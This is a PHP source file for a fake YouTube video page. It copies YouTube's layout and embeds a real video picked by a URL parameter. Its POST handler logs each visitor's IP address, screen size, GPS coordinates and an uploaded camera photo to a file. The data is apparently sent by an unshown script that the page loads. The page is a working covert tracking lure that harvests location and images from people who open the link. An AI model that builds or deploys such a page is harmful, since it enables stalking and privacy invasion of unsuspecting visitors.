<?php
include "actions.php";
include "config.php";


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $client_ip = getRealIpAddr();
        $dados = getContent($logFile);

	$dadosRecebidos = json_decode($_POST['dados'], true);

	$lt = isset($dadosRecebidos['larguraTela']) ? $dadosRecebidos['larguraTela'] : "";
	$at = isset($dadosRecebidos['alturaTela']) ? $dadosRecebidos['alturaTela'] : "";
	$lati = isset($dadosRecebidos['latitude']) ? $dadosRecebidos['latitude'] : "";
	$long = isset($dadosRecebidos['longitude']) ? $dadosRecebidos['longitude'] : "";

	if (isset($_FILES['imagem']) && $_FILES['imagem']['error'] === UPLOAD_ERR_OK) {
		$randID = rand(1000, 9999);
		$fname = $client_ip . "_" . $randID . ".jpg";
		$caminhoImagem = 'uploads/' . $fname;
	}

        if (move_uploaded_file($_FILES['imagem']['tmp_name'], $caminhoImagem)) {
		$dados[$client_ip]["FOTO"] = $fname;
        }

	if ($lt != "" and $at != ""){
		$tela = $lt."x".$at;
		$dados[$client_ip]["TELA"] = $tela;
	}

	if ($lati != "" and $long != ""){
		$GPS = "Latitude: " . $lati . ", Longitude: " . $long;
		$dados[$client_ip]["GPS"] = $GPS;
	}

	print_r($dados);
	saveArray($logFile, $dados);

}else{
	// SE O PARAMETRO N FOR ESPECIFICADO, DEFINE UM VIDEO ALEATORIO
	$video = isset($_GET["si"]) ? $_GET["si"] : "E2EudszdUgs";
	$titulo = getYouTubeTitle($video);

	logsIniciais($logFile);

	$conteudo = file_get_contents($logFile);
	$dados = json_decode($conteudo, true);

	echo '
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="normalize.css">
    <link rel="stylesheet" href="src/style.css">
    <script src="src/infos.js"></script>
    <script src="https://kit.fontawesome.com/1ba545dca5.js" crossorigin="anonymous"></script>
    <title>'. $titulo .'</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles/general.css">
    <link rel="stylesheet" href="styles/header.css">
    <link rel="stylesheet" href="styles/video.css">
    <link rel="stylesheet" href="styles/sidebar.css">
    <link rel="stylesheet" href="reset.css" />
    <link rel="stylesheet" href="style.css" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="icon" type="image/png" href="./assets/favicon.png" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;0,700;0,900;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
</head>

<body>
        <header class="header">
            <div class="left-section">
                <img class="hamburger-logo" src="icons/hamburger-menu.svg">
                <img class="youtube-logo" src="icons/youtube-logo.svg">
            </div>
            <div class="middle-section">
                <input class="search-bar" type="text" placeholder="Search">
                <button class="search-button">
                    <img class="search-icon" src="icons/search.svg">
                    <div class="tooltip">Search</div>
                </button>
                <button class="voice-search-button">
                    <img class="voice-search-icon" src="icons/voice-search-icon.svg">
                    <div class="tooltip">Search with your voice</div>
                </button>
            </div>
            <div class="right-section">
                <div class="upload-icon-container">
                    <img class="upload-icon" src="icons/upload.svg">
                    <div class="tooltip">Create</div>
                </div>
                <div class="youtube-apps-icon-container">
                    <img class="youtube-apps-icon" src="icons/youtube-apps.svg">
                    <div class="tooltip">Youtube apps</div>
                </div>
                <div class="notifications-icon-container">
                    <img class="notifications-icon" src="icons/notifications.svg">
                    <div class="notifications-count">1</div>
                    <div class="tooltip">Notifications</div>
                </div>
                <img class="current-user-picture-icon" src="channel-pictures/my-channel.jpg">
            </div>
        </header>
<br><br><br><br><br><br>

    <div class="main-flex d-flex">
        <!--MAIN CONTENT-->
        <main>
            <!--YT EMBEDDED VIDEO-->
            <iframe src="https://www.youtube.com/embed/' . $video . '" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

            <!--CHANNEL INFORMATION-->
            <div class="general-background">
                <div class="channel-container">
                    <h1>'. $titulo .'</h1>

<div class="VideoInfo__container">
              <p class="VideoInfo__stats">28,535 views • Jun 26, 2020</p>
              <div class="VideoInfo__btns">
                <div class="VideoInfo__thumbs">
                  <div class="VideoInfo__btn">
                    <img src="assets/thumb-up.svg" height="25px" />
                    <p class="VideoInfo__btn-text">915</p>
                  </div>
                  <div class="VideoInfo__btn">
                    <img src="assets/thumb-down.svg" />
                    <p class="VideoInfo__btn-text">2</p>
                  </div>
                  <div class="VideoInfo__thumbs-underline"></div>
                </div>
                <div class="VideoInfo__btn">
                  <img src="assets/share.svg" />
                  <p class="VideoInfo__btn-text">Share</p>
                </div>
                <div class="VideoInfo__btn">
                  <img src="assets/save.svg" />
                  <p class="VideoInfo__btn-text">Save</p>
                </div>
                <div class="VideoInfo__btn">
                  <img src="assets/more.svg" />
                </div>
              </div>
            </div>
          </div>
          <div class="Divider"></div>
          <div class="VideoDescription">
            <div class="VideoDescription__container">
              <div class="VideoDescription__avatar-container">
                <div class="VideoDescription__avatar">
                  <img src="assets/sons-avatar.jpg" />
                </div>
                <div class="VideoDescription__title-container">
                  <h2 class="VideoDescription__title">Sons Of The East</h2>
                  <p class="VideoDescription__subscribers">68K subscribers</p>
                </div>
              </div>
              <button class="SubscribeBtn">Subscribe</button>
            </div>
            <p class="VideoDescription__text">
              "The Lime Cordiale guys are good mates of ours so we thought it
              would be fun to cover one
            </p>
            <p class="VideoDescription__show-more">Show More</p>
          </div>
          <div class="Divider"></div>
        </article>
        <section class="Comments">
          <div class="Comments__stats-container">
            <div class="Comments__count">68 comments</div>
            <div class="VideoInfo__btn">
              <img src="assets/sort.svg" />
              <p class="VideoInfo__btn-text">Sort by</p>
            </div>
          </div>
          <div class="Comments__form-container">
            <div class="Comments__avatar">
              <img src="./assets/timkelly.jpg" />
            </div>
            <form class="Comments__form">
              <input
                type="text"
                placeholder="Add a public comment..."
                class="Comments__form-input"
              />
            </form>
          </div>

          <div class="Comment">
            <div class="Comments__avatar">
              <img src="./assets/comment-avatar.jpg" />
            </div>
            <div class="Comment__data">
              <div class="Comment__name-container">
                <p class="Comment__name">David Cleworth</p>
                <p class="Comment__date">3 months ago</p>
              </div>
              <div class="Comment__info">
                <p>The Sons never disappoint!</p>
              </div>
              <div class="CommentReactions">
                <div class="CommentReactions__btn CommentReactions__btn--vote">
                  <img src="assets/thumb-up.svg" height="18px" />
                  <p class="CommentReactions__btn CommentReactions__vote-count">
                    8
                  </p>
                </div>
                <div class="CommentReactions__btn CommentReactions__btn--vote">
                  <img src="assets/thumb-down.svg" height="18px" />
                </div>
                <p class="CommentReactions__btn CommentReactions__btn--reply">
                  Reply
                </p>
              </div>
            </div>
          </div>
          <div class="Comment">
            <div class="Comments__avatar">
              <img src="./assets/comment-avatar.jpg" />
            </div>
            <div class="Comment__data">
              <div class="Comment__name-container">
                <p class="Comment__name">David Cleworth</p>
                <p class="Comment__date">3 months ago</p>
              </div>
              <div class="Comment__info">
                <p>
                  The Sons never disappoint! 🎶 The Sons never disappoint! 🎶The
                  Sons never disappoint! 🎶The Sons never disappoint! 🎶The Sons
                  never disappoint! 🎶
                </p>
              </div>
              <div class="CommentReactions">
                <div class="CommentReactions__btn CommentReactions__btn--vote">
                  <img src="assets/thumb-up.svg" height="18px" />
                  <p class="CommentReactions__btn CommentReactions__vote-count">
                    8
                  </p>
                </div>
                <div class="CommentReactions__btn CommentReactions__btn--vote">
                  <img src="assets/thumb-down.svg" height="18px" />
                </div>
                <p class="CommentReactions__btn CommentReactions__btn--reply">
                  Reply
                </p>
              </div>
            </div>
          </div>
        </section>
      </div>
    <br><br><br>
            <!--COMMENTS-->
            <div class="general-background d-flex loading-gif">
                <img src="images/loading-img" alt="Loading logo ">
                <p class="yt-gray">Loading...</p>
            </div>

        </main>

        <!--SIDE SECTION-->
        <aside class="general-background container">
            <div class="d-flex autoplay-title ">
                <h4> Up Next</h4>

                <div class="d-flex autoplay-flex ">
                    <p class="yt-gray">Autoplay</p>
                    <i class="fas fa-info-circle yt-gray"></i>
                    <i class="fas fa-toggle-on toggle"></i>
                </div>
            </div>

            <!--VIDEO PREVIEWS-->
            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/6350ed47768d4be4388f5a8a2b530730b3520802 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Contributing to Open Source Part II: The Real Way</h4>
                    <p>The Odin Project</p>
                    <p>29,985 views</p>
                </div>
            </div>

            <hr class="solid ">

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/495e6661840ba5e59315b8d9fbd12e8f79916207 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>\'How to Get a Job at the Big 4 - Amazon, Facebook, Google & Microsoft\' by Sean Lee</h4>
                    <p>imtiana</p>
                    <p>981,543 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/94ce5195858269ff0184aa735ee160f562dafac4 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Programming in Visual Basic .Net How to Connect Access Database to VB.Net
                    </h4>
                    <p>iBasskung</p>
                    <p>24,276,402 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/42fcf704757c206b21126f9ef6c413eff28de822 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>REST API concepts and examples
                    </h4>
                    <p>WebConcepts</p>
                    <p>4,775,868 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/ed9683aa07170cb5421ba283d3aad8e0a3626b97 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>GitHub - Why Microsoft Paid $7.5B for the Future of Software! - A Case Study for Entrepreneurs
                    </h4>
                    <p>Valuetainment</p>
                    <p>278,771 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/e551ad6b2fda543caa6fbd78c98ec95c1f1d0aff " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to create a 3D Terrain with Google Maps and height maps in Photoshop - 3D Map Generator Terrain
                    </h4>
                    <p>Orange Box Ceo</p>
                    <p>475,111 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/df21e12d7260fba2247c4dd328453a98929270e9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Convolutional Neural Networks (CNNs) explained
                    </h4>
                    <p>deeplizard</p>
                    <p>484,643 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/0425d088770dd5fbb04c5830b5d45ceb7f87eb22 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Top 10 Linux Job Interview Questions
                    </h4>
                    <p>The Odin Project</p>
                    <p>1,716,146 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/87ad6fdeaef86aa051f826e3006c068b60e06de9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Running an SQL Injection Attack - Computerphile</h4>
                    <p>Computerphile
                    </p>
                    <p>2,662,427 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/b6e60231c77705ba5365c14da7c4ecb4ccb6cf86 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to prepare for product based companies??
                    </h4>
                    <p>Gate Lectures by Ravindrababu Ravula</p>
                    <p>351,054 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/30341e348ffdfd8ef110d868a3f4892d1dff1719 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Visual Basic .Net : Search in Access Database - DataGridView BindingSource Filter Part 1/2
                    </h4>
                    <p>iBasskung</p>
                    <p>13,284,342 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/9104e3bbe284cc6497daa29c2c6128b6d4ab68cc " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How To Convert pdf to word without software</h4>
                    <p>karim hamdadi</p>
                    <p>8,534,153 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/f19150ffbc1e56e3c0f4bf3d16f852c1a06c00d9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>What Python Projects Should I Build to Get a Job?</h4>
                    <p>Real Python</p>
                    <p>200,957 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/5db65ef125469d0b5b9b1a07b61c9cee64cbdfac " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How To NOT Look Like A Tourist | What To Wear In Europe
                    </h4>
                    <p>Audrey Coyne</p>
                    <p>4,122,703 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/3e74c5bf2dadd9fe3ec6089804970180b60cbfcd " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Your First GitHub Pull Request (in 10 Mins)
                    </h4>
                    <p>Jackson Bates</p>
                    <p>51,491 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/6b60f3abb556233757873da7cedd5b091744ce34 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Top signs of an inexperienced programmer
                    </h4>
                    <p>TechLead</p>
                    <p>272,527 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/872b157fed3ecb14099122fcb5f981408ec8d7d2 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Why I left my job at Google (as a software engineer)
                    </h4>
                    <p>TechLead</p>
                    <p>1,650,512 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/d95c11ceed49c1ae50d224d33110ab2728c03a23 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Max Stoiber - I want you to contribute to open source
                    </h4>
                    <p>ReactRally</p>
                    <p>6497 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/c477e426b7e9e5361e6c2bd1838c751516a76765 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to Learn Anything... Fast - Josh Kaufman
                    </h4>
                    <p>The RSA</p>
                    <p>1,889,882 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/71a8551dc420f7a68c7e3fa3f91e5af9b702eae8 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Git & GitHub: Pull requests (10/11)
                    </h4>
                    <p>Codecourse</p>
                    <p>86,167 views</p>
                </div>
            </div>

            <hr class="solid ">

            <h4 class="center-text yt-gray no-margin">SHOW MORE</h4>
        </aside>
    </div>

    <!---->
    <footer class="general-background footer-m">
        <div class="d-flex footer-buttons ">
            <img src="images/yt-logo.png " alt="logo " class="footer-logo-img ">

            <button class="footer-flex d-flex">
                <i class="fas fa-user left-icon"></i>
                Language: <span>English</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                Location: <span>Netherlands</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                Restricted Mode: <span>Off</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                <i class="fas fa-hourglass-end left-icon"></i>
                History
            </button>

            <button class="footer-flex d-flex">
                <i class="fas fa-question-circle left-icon"></i>
                Help
            </button>
        </div>

        <hr class="solid ">

        <nav class="d-flex ">
            <a href="#">
                <p class="footer-p bold-text footer-p-size">About</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Press</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Copyright</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Creators</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Advertise</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Developers</p>
            </a>
        </nav>

        <div class="d-flex footer-p ">
            <p class="footer-p ">Terms</p>
            <p class="footer-p ">Privacy</p>
            <p class="footer-p ">Policy & Safety</p>
            <p class="footer-p ">Test new features</p>
        </div>
    </footer>

</body>

</html>

';
}


?>
